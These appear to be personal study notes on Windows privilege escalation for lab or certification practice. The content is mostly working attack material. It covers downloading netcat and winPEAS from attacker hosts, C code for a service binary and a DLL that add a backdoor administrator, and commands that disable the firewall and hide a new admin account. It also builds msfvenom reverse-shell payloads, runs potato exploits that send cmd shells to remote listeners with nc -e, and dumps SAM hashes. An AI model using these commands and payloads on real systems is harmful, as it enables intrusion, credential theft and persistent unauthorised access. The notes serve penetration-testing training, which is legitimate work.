---
title: Windows Privilege Escalation
---
# Enumeration
- We can display the integrity level of processes with `Process Explorer`, for files using `icacls` or `Get-Acl`, and for the current user with`whoami /groups`
- Check [LOLBAS](https://lolbas-project.github.io/#) for ways to use or misuse common binaries found on Windows (Living Off the Land)

## File Transfer
- To transfer file, we can host our own SMB server with `impacket-smbserver` and then map it from the windows hosts with `net use`. After we can copy files
```zsh
impacket-smbserver -smb2support alexa . -username alexa -password password123
```
```powershell
net use \\192.168.45.232\alexa password123 /user:alexa

copy .\bloodhound_marcus.zip \\192.168.45.232\alexa\
```
- We can also use `certutil.exe` or `curl` (Starting from Windows 10) to download a file
```powershell
certutil.exe -urlcache -split -f http://192.168.45.176:8080/nc.exe nc.exe

curl http://192.168.45.176:8080/nc.exe -o nc.exe
```
- We can also use the built-in functions `download` and `upload` from `evil-winrm` to transfer files
```zsh
download <filename> <path-on-localhost/filename>

upload <path-on-localhost/filename> <filename>

#For example uploading the ligolo agent binary
upload /usr/share/windows-resources/binaries/ligolo-agent/agent.exe agent.exe
```
## Information Checklist
- [ ] Username and hostname
	- [ ] Check current user - `whoami` or `whoami /all` for more information
- [ ] Group memberships of the current user
	- [ ] Check current user groups membership - `whoami /groups`
- [ ] Existing users and groups
	- [ ] Check local users  - `net user` or `net user username` for a specific user
	- [ ] Check local user - `Get-LocalUser`
	- [ ] Check local groups - `net localgroup`
	- [ ] Check local groups - `Get-LocalGroup`
	- [ ] Check local group member - `net localgroup "group name"`
	- [ ] Check local group members - `Get-LocalGroupMember groupname`
- [ ] Operating system, version and architecture
	- [ ] Check system information - `systeminfo`
	- [ ] Get Windows Version - `wmic os get Caption, Version, OSArchitecture` 
	- [ ] Get Windows version - `(Get-WmiObject -Class Win32_OperatingSystem).Caption, (Get-WmiObject -Class Win32_OperatingSystem).Version, (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture`
	- [ ] Get Windows version - `Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OSArchitecture`
- [ ] Network information
	- [ ] Check IP configuration - `ipconfig /all`
	- [ ] Check routes - `route print`
	- [ ] Check active connections - `netstat -ano`
- [ ] Installed applications
	- [ ] Check registry for x86 applications - `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` - Remove `select displayname` for more verbose output
	- [ ] Check registry for x64 applications - `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` - Remove `select displayname` for more verbose output
	- [ ] Check `C:\Program Files` for both x64 and x86
	- [ ] Check `Downloads` directory of current user to find more potential programs
- [ ] Running processes
	- [ ] Check running processes - `Get-Process`
	- [ ] Check paths of running processes - `Get-Process | ForEach-Object {$_.Path}` or `Get-Process -FileVersionInfo`
	- [ ] Check path of specific process - `Get-Process -id 2528  -FileVersionInfo`
- [ ] Interesting files
	- [ ] Check for password manager extensions - `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` or `dir /s /b \*.kdbx`
	- [ ] Check for configuration files - `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.conf,*.yml -File -Recurse -ErrorAction SilentlyContinue` 
	- [ ] Check for sensitive strings inside files - `Get-ChildItem -Recurse | Select-String "password" -List | Select Path` or `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
	- [ ] Check for document file - `Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
	- [ ] Check hidden files - `ls -force c:\Users\*\*\*` or `tree /f /a c:\Users\`

## Powershell
- Powershell can contain a lot of information
- We can get the powershell history with `Get-History`
> [!IMPORTANT]
> Clear-History does not clear the command history recorded by PSReadline.

-  We can check the savepath of this PSReadline history file and then try to loop over all users
```powershell
(Get-PSReadlineOption).HistorySavePath

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
- If we have valid creds for a user that is a member of the local Windows Management Users, we can try `Enter-PSSession`
```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```
- If we have access to the Event Viewer we can search through PowerShell Script Block Logging Events with ID `4104`. Events are stored in `Applications and Services -> Microsoft -> Windows -> PowerShell -> Operational`


## Automated Enumeration
> [!WARNING]
> Automated tools might provide false information or miss information that can be gathered by manual enumeration! Never rely on automated tools alone!

- Different tools such as `winPEAS`, `Seatbelt`, `PowerUp` or `JAWS`
- We can use `winPEAS` or `Seatbelt` to automate enumeration
```powershell
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe

.\winPEAS.exe

.\Seatbelt.exe -group=all
```
> [!HINT]
> To enable colors for `winPEAS` we need to add a registry key `REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1` and restart the cmd.
# RDP Access
- It can be easier to perform enumeration if we have access to RDP. In case the necessary prerequisites are given, we can use `xfreedrp3` to establish an RDP session
```zsh
xfreerdp3 /u:stephanie /d:corp.com /p:"LegmanTeamBenzoin\!\!" /v:192.168.124.75 /dynamic-resolution /drive:alexa,/home/redo/Documents/oscp/exercises/ActiveDirectory
```
> [!IMPORTANT]
> We have to escape any `zsh` specific characters within passwords or username such as !,$
- If RDP is not enabled, we can enable it using those steps
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f 


netsh advfirewall set allprofiles state off

net user /add alexa init12345 && net localgroup administrators alexa /add & net localgroup "Remote Desktop Users" alexa /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v alexa /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto

```
# Leveraging Windows Services

## Enumeration
- We can use the GUI snap-in `services.msc`, `Get-Service`, `tasklist`, `sc` or `Get-CimInstance` to enumerate services
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

tasklist /SVC

wmic service get name,displayname,pathname,startmode

wmic service where caption="Servicename" get name, state, startmode

sc qc SomeService
```
> [!WARNING]
> When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.

## Hijack service binaries
- To check the permission we have on service binaries, we can use `icacls` or `Get-ACL`
```powershell
icacls "C:\xampp\mysql\bin\mysqld.exe"
```
- If we have Full or Write access, we can replace the binary with our own
```c++
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user alexa password123! /add");
  i = system ("net localgroup administrators alexa /add");
  
  return 0;
}
```
- Cross compile the above with `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
- After replacing the binary, we need to restart the service. We can check the startup type of a service using `Get-CimInstance`
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

net stop mysql
net start mysql

.\sc.exe start mysql
.\sc.exe stop mysql
```
> [!IMPORTANT]
> If the service startup type is set to `Auto` we may not be able to stop and start it manually. In such a case we need to check if we have to `SeShutdownPrivilege`  in order to restart the machine with `shutdown /r /t 0`, which would trigger a service restart. 
> We can also try to use `.\sc.exe config <servicename> start=demand` to change the startup type. 
- We can also use `PowerUp` and its function `Get-ModifiableServiceFile` to check this
```powershell
iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

. .\PowerUp.ps1

Get-ModifiableServiceFile

Install-ServiceBinary -Name 'mysql'
```
> [!IMPORTANT]
> By default, `PowerUp.ps1` will create a user called `john` with password `Password123!` and try to add the user to the local Administrators group

## Hijack service DLLs
- With safe DLL search enabled, the standard order of search for DDLs are 
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```
- With safe DDL search disabled, the current directory is searched at position 2
- We can try placing a malicious DDL (with the name of the missing DDL) in a path of the DDL search order
- So see which DDLs get loaded by an application, we can use `procmon.exe`
> [!IMPORTANT]
> Process Monitor itself needs administrative privileges to collect this data. We could however extract the service binary to a local machine and use Process Monitor to list all DLL activity
- We can craft our own malicious DDL and compile it
```C++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user alexa init_12345 /add");
  	    i = system ("net localgroup administrators alexa /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```zsh
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```
- This code will get executed under the privilege of whoever opens the application that is loading the DLL. In the above case, we need someone with administrative privileges since we are adding alexa to the administrators group
## Abuse Unquoted Service Paths
- If we have write access to a service's main directory or subdirectory but can not replace file within, we can check if the service path is unquoted and contains one or more spaces
- For example, the unquoted service binary `C:\Program Files\My Program\My Service\service.exe` will get interpreted in the following order while loading
```powershell
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
- We can list running and stopped services with `wmic` or `Get-CimInstance`
```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
i
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
- The `/v` parameter in `findstr` will perform an inverse match - i.e only list string that do not contain `C:\Windows\` and `"` 
- We can check if we can start and stop a service with `Start-Service servicename` and `Stop-Service servicename`
- We can use the function `Get-UnquotedService` from `PowerUp.ps1` to automate enumeration and also exploit it
```powershell
iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

. .\PowerUp.ps1

Get-UnquotedService

Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

Restart-Service GammaService
```
> [!IMPORTANT]
> By default, `PowerUp.ps1` will create a user called `john` with password `Password123!` and try to add the user to the local Administrators group

# Abusing Other Windows Components

## Scheduled Tasks
- To identify possible privilege escalation vectors, the following pieces of information are vital
	- As which user account (principal) does this task get executed?
	- What triggers are specified for the task?
	- What actions are executed when one or more of these triggers are met?
- To list scheduled tasks we can use `Get-ScheduledTask` or `schtasks /query`
```powershell
schtasks /query /fo LIST /v

schtasks /query /fo LIST /v /TN "My Task"
```
- The parameter `/fo LIST` will set the output format to as list
- The parameter `/v` will enable verbose output and provide more information
- The parameter `/TN` will only display the task with specified as taskname
- In regards to the three questions above, we should check the output fields `Author`, `TaskName`, `Task To Run`, `Run As User`and `Next Run Time`
- Check if any executables, scripts or files involved in the tasks are accessible using `icacls`
- Replace the executable or script with a malicious payload and execute the trigger

## Elevated Installation
- If we have the registry key `AlwaysInstallElevated` set in `HKLM` and `HKCU`, installations will always be run as `NT AUTHORITY\SYSTEM`
- We can check if this is the case with `reg`
```powershell 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- As shown on [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated) we can abuse this by crafting a malicious `.msi` package using `msfvenom`
```zsh
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=192.168.45.238 LPORT=135 -f msi > elevateme.msi

#Transfer this onto Windows host and execute
iwr -uri http://192.168.45.238/elevateme.msi -outfile elevateme.msi

.\elevateme.msi
```

# Using Exploits
- Check user privileges with `whoami /priv`
- Check Windows version with `systeminfo`
- Check installed security patches with `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
- Refer to the [Microsoft Security Reponse Center - Update Guide](https://msrc.microsoft.com/update-guide) to find potential vulnerabilites that affect the found product

# Abusing Privileges
> [!IMPORTANT]
> Privileges that may lead to privilege escalation are `SeImpersonatePrivilege`,`SeBackupPrivilege`, `SeAssignPrimaryToken` , `SeManageVolumePrivilege`, `SeLoadDriver` and `SeDebug`
- We often come accross those privileges after exploiting IIS (or other Windows services) and obtaining code executios as IIS will run as `LocalService`, `LocalSystem`, `NetworkService` or `ApplicationPoolIdentity` all of which have the the `SeImpersonatePrivilege`
### SeImpersonatePrivilege
- If we encounter a user with `SeImpersonatePrivilege` we can try different potato attack such as [GodPotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) or [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) (Other variants being _RottenPotato_, _SweetPotato_ , _JuicyPotato_)
- In case of JuicyPotato, we might need to hunt for specific CLSIDs which can be looked up on this [Github repository](https://github.com/ohpe/juicy-potato/tree/master/CLSID) (wuauserv is often a good candidate)
- Also check out [Hacktricks - RoguePotato and Printspoofer](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer) and the [jlajara Github Page on Potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
```powershell
GodPotato -cmd "C:\Users\Public\reverse.exe"

GodPotato -cmd "net user /add backdoor Password123"
GodPotato -cmd "net localgroup administrators /add backdoor"

SigmaPotato "net user /add backdoor Password123"
SigmaPotato "net localgroup administrators /add backdoor"

RunasCs.exe backdoor Password123 "C:\Users\Public\reverse.exe" --force-profile --logon-type 8

.\runascs.exe backdoor Password123 "C:\Users\alexa\nc.exe 192.168.45.176 9001 -e cmd" --force-profile --logon-type 8

.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\nc.exe 192.168.45.238 80 -e cmd.exe" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

### SeBackupPrivilege
- If we have the `SeBackupPrivilege` we can dump the SAM and SYSTEM hives and use `impacket-secretsdump` to get the hashes
```powershell
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```
```zsh
impacket-secretsdump -sam sam.hive -system system.hive local
```

### SeManageVolumePrivilege
- We can escalate our privileges by using `SeManageVolumeExploit.exe` and following the steps as shown on [CsEnox Github](https://github.com/CsEnox/SeManageVolumeExploit)
```powershell
#Transfer the exploit to our target
iwr -uri http://192.168.45.162/SeManageVolumeExploit.exe -outfile SeManageVolumeExploit.exe

#Run it to get write access
.\SeManageVolumeExploit.exe

#Create a malicious Printconfig.dll and transfer it to our target
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.162 LPORT=443 -f dll -o Printconfig.dll

#Copy it to C:\Windows\System32\spool\drivers\x64\3\
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\

#Trigger it and catch the reverseshell
rlwrap nc -lvnp 443
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```
- Another trigger we could employ is via Windows Error Reporting `WerTrigger.exe` in combination with `phoneinfo.dll` as shown on [Github](https://github.com/sailay1996/WerTrigger/tree/master)
## Recovering Privileges
- If we get a shell as `nt authority\local service` and are missing privileges (i.e `SeImpersonatePrivilege`) as listed by [Microsoft](https://learn.microsoft.com/en-us/windows/win32/services/localservice-account) we can use [FullPowers](https://github.com/itm4n/FullPowers) as described in [Give Me Back My Privileges](https://itm4n.github.io/localservice-privileges/?ref=benheater.com)
- If the tool does not work, we can recreate the steps manually. 
```powershell
# Create an action for the task
New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.45.180 80 -e powershell.exe`""

# Create the task 
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"

# Start the task 
Start-ScheduledTask -TaskName "GrantPerm"

# Create a list of privileges 
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeShutdownPrivilege", "SeUndockPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege"

# Create a Principal for the task 
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs

# Create an action for the task
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\Temp\nc.exe 192.168.45.180 80 -e powershell.exe`""

# Create the task 
Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal 

# Start the task 
Start-ScheduledTask -TaskName "GrantAllPerms"
```
